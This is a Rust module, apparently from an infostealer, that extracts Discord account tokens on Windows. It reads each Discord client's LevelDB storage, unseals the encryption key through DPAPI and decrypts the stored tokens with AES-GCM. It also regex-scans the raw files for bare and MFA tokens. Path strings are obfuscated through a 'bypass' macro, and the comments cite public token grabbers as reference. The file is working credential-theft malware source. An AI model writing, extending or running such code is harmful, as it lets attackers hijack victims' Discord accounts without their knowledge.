//! Discord desktop app token extraction (wave 8).
//!
//! Research-based layout (see module docs in `lib.rs`): each installed client
//! keeps an Electron LevelDB at `%APPDATA%\<client>\Local Storage\leveldb`.
//! Tokens appear two ways:
//!
//!   1. bare user token `[\w-]{24}\.[\w-]{6}\.[\w-]{27}` or MFA token
//!      `mfa\.[\w-]{84}` inside a stored value;
//!   2. wrapped `dQw4w9WgXcQ:<base64>` where the base64 decodes to a Chromium
//!      v10 ciphertext (3B version + 12B nonce + ct+tag) sealed under the AES
//!      key from `Local State` → `os_crypt.encrypted_key` (DPAPI). Discord is
//!      Electron, so `hbd_crypto`'s existing DPAPI + AES-GCM decrypt it.
//!
//! Locking: the LevelDB is read via a `filemanager::Session` copy (the exact
//! pattern the browser extractors use) so a running Discord never fails the
//! read.

use std::path::{Path, PathBuf};

use hbd_crypto::{decrypt_chromium_gcm, decrypt_dpapi};
use regex::Regex;
use std::sync::LazyLock;

use crate::DiscordToken;

/// `dQw4w9WgXcQ:` wrapper prefix — the bytes before the base64 ciphertext.
const WRAP_PREFIX: &str = "dQw4w9WgXcQ:";
/// Length of the `DPAPI` marker preceding the blob in `encrypted_key`.
const DPAPI_MARKER_LEN: usize = 5;

/// User token shape for the *regex* (wide — catches as many candidates as
/// possible, the strict shape check in [`looks_like_token`] gates them):
/// `<22-36 id>.<6+ ts>.<27+ hmac>`.
static RE_USER: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[\w-]{22,36}\.[\w-]{6,}\.[\w-]{27,}").unwrap());
/// MFA token shape: `mfa.<84>`.
static RE_MFA: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"mfa\.[\w-]{84}").unwrap());

/// Unicode-safe `\w-`-ish character test for the id/hmac segments.
fn is_seg_char(c: u8) -> bool {
    c.is_ascii_alphanumeric() || c == b'-' || c == b'_'
}

/// True when the candidate has Discord's real token shape — gate used before a
/// token ever costs a `/users/@me` probe. User tokens: `base64(user_id).ts.hmac`
/// where `base64(user_id)` decodes to a bare decimal user id (17-19 digits), so
/// a JWT (`eyJ...` ⇒ `{"...`) or random base64 can't pass. MFA: `mfa.<84>`
/// would be rejected by this too, so MFA candidates are checked separately.
fn looks_like_user_token(t: &str) -> bool {
    let mut parts = t.split('.');
    let (Some(id), Some(ts), Some(hmac), None) =
        (parts.next(), parts.next(), parts.next(), parts.next())
    else {
        return false;
    };
    if id.len() < 22 || ts.len() < 6 || hmac.len() < 27 {
        return false;
    }
    let id = id.as_bytes();
    if !id.iter().all(|&b| is_seg_char(b)) {
        return false;
    }
    use base64::Engine as _;
    match base64::engine::general_purpose::URL_SAFE_NO_PAD.decode(id) {
        Ok(bytes) => {
            !bytes.is_empty()
                && bytes.len() >= 16
                && bytes.len() <= 21
                && bytes.iter().all(|b| b.is_ascii_digit())
        }
        Err(_) => false,
    }
}

/// True when the candidate is a plausible token: user or MFA shape.
fn looks_like_token(t: &str) -> bool {
    looks_like_user_token(t)
        || (t.starts_with("mfa.")
            && t.len() == 88
            && t.as_bytes()[4..].iter().all(|&b| is_seg_char(b)))
}

/// The Discord desktop client names (install dirs under `%APPDATA%`), in the
/// order public grabbers enumerate them (stable; also the output order).
const CLIENTS: &[(&str, &str)] = &[
    ("Discord", "discord"),
    ("Discord PTB", "discordptb"),
    ("Discord Canary", "discordcanary"),
    ("Discord Development", "DiscordDevelopment"),
];

/// Extracts tokens from every installed Discord app client.
///
/// `app_data_dir` overrides the roaming dir (tests pass a fixture tree); `None`
/// resolves the real `%APPDATA%`.
pub fn extract(app_data_dir: Option<&str>) -> Vec<DiscordToken> {
    let Some(roaming) = resolve_roaming(app_data_dir) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for (label, sub) in CLIENTS {
        let client_dir = roaming.join(sub);
        if !client_dir.is_dir() {
            continue;
        }
        out.extend(extract_client(label, &client_dir));
    }
    out
}

/// Resolve the roaming dir: override, else the `APPDATA` env var.
fn resolve_roaming(app_data_dir: Option<&str>) -> Option<PathBuf> {
    match app_data_dir {
        Some(p) if !p.is_empty() => Some(PathBuf::from(p)),
        _ => std::env::var_os("APPDATA").map(PathBuf::from),
    }
}

/// One client: read the AES key from `Local State`, scan the leveldb tree.
fn extract_client(label: &str, client_dir: &Path) -> Vec<DiscordToken> {
    // Master key: `Local State` → `os_crypt.encrypted_key` (base64, `DPAPI`
    // marker) → DPAPI-unseal → AES key. Missing/unreadable → still scan for
    // bare tokens (older clients store them plaintext).
    let key = read_local_state_key(&client_dir.join(bypass::x!("Local State", 0x7C).as_str()));

    let leveldb = client_dir
        .join(bypass::x!("Local Storage", 0x2A).as_str())
        .join("leveldb");
    if !leveldb.is_dir() {
        return Vec::new();
    }

    // Two independent passes:
    //  1. structured — open the tree, scan each decoded (key, value) pair;
    //  2. raw bytes — regex every `.ldb`/`.log` file directly.
    // A live Discord tree can have torn tables the structured reader must skip
    // (returning partial/empty), while the flattened bytes still carry every
    // token — so the raw pass always runs and `collect` dedups the combined
    // results. The raw pass also catches blob bytes that survive compaction
    // outside a decodable table.
    let mut toks = Vec::new();
    match scan_leveldb(&leveldb) {
        Ok(entries) => {
            let path = leveldb.display().to_string();
            for (k, v) in entries {
                let mut buf = Vec::with_capacity(k.len() + v.len());
                buf.extend_from_slice(&k);
                buf.push(0);
                buf.extend_from_slice(&v);
                toks.extend(scan_bytes(label, &path, &buf, key.as_deref()));
            }
        }
        Err(e) => {
            log::debug!(
                "{}: {label}: leveldb scan failed ({e})",
                bypass::x!("discord", 0x5B)
            );
        }
    }
    toks.extend(raw_file_scan(label, &leveldb, key.as_deref()));
    toks
}

/// Reads + unseals the `os_crypt.encrypted_key` from a Discord `Local State`.
fn read_local_state_key(local_state: &Path) -> Option<Vec<u8>> {
    let raw = std::fs::read(local_state).ok()?;
    let v: serde_json::Value = serde_json::from_slice(&raw).ok()?;
    let b64 = v.pointer("/os_crypt/encrypted_key")?.as_str()?;
    use base64::Engine as _;
    let blob = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
    if blob.len() <= DPAPI_MARKER_LEN {
        return None;
    }
    decrypt_dpapi(&blob[DPAPI_MARKER_LEN..]).ok()
}

/// Opens the leveldb dir via a Session copy and returns all (key, value) pairs.
fn scan_leveldb(leveldb: &Path) -> std::io::Result<Vec<(Vec<u8>, Vec<u8>)>> {
    let session = filemanager::Session::new()?;
    let dst = session.temp_dir().join("leveldb");
    session
        .acquire(leveldb, &dst, true)
        .map_err(|e| std::io::Error::other(e.to_string()))?;
    let db = browser::chromium::leveldb::LevelDb::open(&dst)
        .map_err(|e| std::io::Error::other(e.to_string()))?;
    Ok(db.iter().to_vec())
}

/// Fallback when the structured reader fails: regex the raw bytes of each
/// `.ldb`/`.log` file (matches the reference grabber repos, which do exactly
/// this on the real files).
fn raw_file_scan(label: &str, leveldb: &Path, key: Option<&[u8]>) -> Vec<DiscordToken> {
    let session = match filemanager::Session::new() {
        Ok(s) => s,
        Err(_) => return Vec::new(),
    };
    let dst = session.temp_dir().join("leveldb");
    if session.acquire(leveldb, &dst, true).is_err() {
        return Vec::new();
    }
    let mut toks = Vec::new();
    let Ok(entries) = std::fs::read_dir(&dst) else {
        return Vec::new();
    };
    for e in entries.flatten() {
        let Ok(ft) = e.file_type() else {
            continue;
        };
        if !ft.is_file() {
            continue;
        }
        let name = e.file_name().to_string_lossy().into_owned();
        if !name.ends_with(".ldb") && !name.ends_with(".log") {
            continue;
        }
        let Ok(buf) = std::fs::read(e.path()) else {
            continue;
        };
        // Path = the real on-disk file the bytes came from (the Session copy
        // keeps the same relative name, so rejoin against the original dir).
        let origin = leveldb.join(&name);
        let origin_str = origin.display().to_string();
        toks.extend(scan_bytes(label, &origin_str, &buf, key));
    }
    toks
}

/// Regex a byte buffer for wrapped + bare tokens, decrypting wrapped blobs
/// when a key is available. `path` is the on-disk location the bytes came from
/// (leveldb dir or the exact `.ldb`/`.log` file).
pub(crate) fn scan_bytes(
    label: &str,
    path: &str,
    buf: &[u8],
    key: Option<&[u8]>,
) -> Vec<DiscordToken> {
    // Lossy on purpose: the raw fallback scans binary `.ldb` files (Snappy
    // tables, varint keys). Strict UTF-8 would reject the whole buffer the
    // moment a single non-ASCII byte shows up and drop every token in it;
    // replacement chars can't fake a token (they're non-ASCII).
    let s = String::from_utf8_lossy(buf).into_owned();
    let mut out = Vec::new();

    // Wrapped: `dQw4w9WgXcQ:<base64>`. Try to decrypt to the real token; if
    // no key or the unseal fails, keep the raw blob (still usable / visible).
    if s.contains(WRAP_PREFIX) {
        use base64::Engine as _;
        let mut rest = s.as_str();
        while let Some(idx) = rest.find(WRAP_PREFIX) {
            let start = idx + WRAP_PREFIX.len();
            let tail = &rest[start..];
            let b64 = tail
                .split(|c: char| !(c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '='))
                .next()
                .unwrap_or("");
            if let Ok(blob) = base64::engine::general_purpose::STANDARD.decode(b64) {
                // Try to unseal: key present → AES-GCM (Chromium v10 layout).
                // Failure (no key, wrong key, non-token plaintext) keeps the
                // raw wrapper — still surfaced, still greppable.
                let decrypted = key
                    .and_then(|k| decrypt_chromium_gcm(k, &blob).ok())
                    .and_then(|plain| String::from_utf8(plain).ok())
                    .map(|t| t.trim().to_string())
                    .filter(|t| is_token(t));
                match decrypted {
                    Some(tok) => {
                        out.push(DiscordToken::found(format!("app:{label}"), path, tok));
                    }
                    None => {
                        out.push(DiscordToken::found(
                            format!("app:{label}"),
                            path,
                            format!("{WRAP_PREFIX}{b64}"),
                        ));
                    }
                }
                rest = &rest[start + b64.len()..];
                continue;
            }
            rest = &rest[start..];
        }
    }

    // Bare user/MFA tokens — gated by strict shape so JWT/random base64 in
    // storage never reaches the API probe.
    for m in RE_USER.find_iter(&s) {
        let t = m.as_str().to_string();
        if looks_like_token(&t) {
            out.push(DiscordToken::found(format!("app:{label}"), path, t));
        }
    }
    for m in RE_MFA.find_iter(&s) {
        let t = m.as_str().to_string();
        if looks_like_token(&t) {
            out.push(DiscordToken::found(format!("app:{label}"), path, t));
        }
    }
    out
}

/// Strict shape check for a decrypted token (user or MFA). The wrapper path
/// decrypts only Chromium-sealed blobs whose plaintext is a real token, so the
/// loose regex is enough there — keep the gate anyway for safety.
fn is_token(t: &str) -> bool {
    looks_like_token(t)
}

#[cfg(test)]
mod tests {
    use super::*;
    use base64::Engine as _;

    fn fixture_roaming(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "lemon-discord-{}-{}-{}",
            tag,
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn jwt_and_chatgpt_tokens_rejected() {
        let jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        let chatgpt = "sk-NKILzK9ZArpEjLPRhllL1yQbQbmGhkMkBlJwagZYXhTWonY8gS33";
        assert!(scan_bytes("Discord", "C:\\leveldb", jwt.as_bytes(), None).is_empty());
        assert!(scan_bytes("Discord", "C:\\leveldb", chatgpt.as_bytes(), None).is_empty());
    }

    #[test]
    fn uuid_like_false_positive_rejected() {
        let uuid = "9322d801-d83f-49b2-bc27-2e26b46fc2ad.ababab.THISISNOTAREALTOKENOFCOURSE";
        assert!(scan_bytes("Discord", "C:\\leveldb", uuid.as_bytes(), None).is_empty());
    }

    #[test]
    fn literal_digits_id_rejected() {
        let s = "101234567890123456789012.madcowdeadbeefdeadbeef.THISISNOTAREALTOKENOFCOURSE";
        assert!(scan_bytes("Discord", "C:\\leveldb", s.as_bytes(), None).is_empty());
    }

    #[test]
    fn bare_tokens_found_in_bytes() {
        let s = br#"{"token":"MTAxMjM0NTY3ODkwMTIzNDU2Nw.madcowdeadbeefdeadbeef.THISISNOTAREALTOKENOFCOURSE"}"#;
        let toks = scan_bytes("Discord", "C:\\leveldb", s, None);
        assert_eq!(1, toks.len());
        assert_eq!("app:Discord", toks[0].source);
        assert_eq!("C:\\leveldb", toks[0].path);
    }

    #[test]
    fn mfa_token_found() {
        let s = format!("mfa.{}", "w".repeat(84));
        let toks = scan_bytes("Discord", "C:\\leveldb", s.as_bytes(), None);
        assert_eq!(1, toks.len());
    }

    #[test]
    fn wrapped_token_kept_raw_without_key() {
        let wrapped = format!(
            "{WRAP_PREFIX}{}",
            base64::engine::general_purpose::STANDARD.encode(b"not-a-ciphertext")
        );
        let toks = scan_bytes("Discord", "C:\\leveldb", wrapped.as_bytes(), None);
        assert_eq!(1, toks.len());
        assert!(toks[0].token.starts_with(WRAP_PREFIX));
    }

    #[test]
    fn resolve_roaming_override_wins() {
        let p = resolve_roaming(Some("C:\\fake\\roaming")).unwrap();
        assert_eq!(PathBuf::from("C:\\fake\\roaming"), p);
    }

    #[test]
    fn no_client_dirs_yields_nothing() {
        let roaming = fixture_roaming("empty");
        let toks = extract(Some(roaming.to_str().unwrap()));
        assert!(toks.is_empty());
        let _ = std::fs::remove_dir_all(&roaming);
    }
}
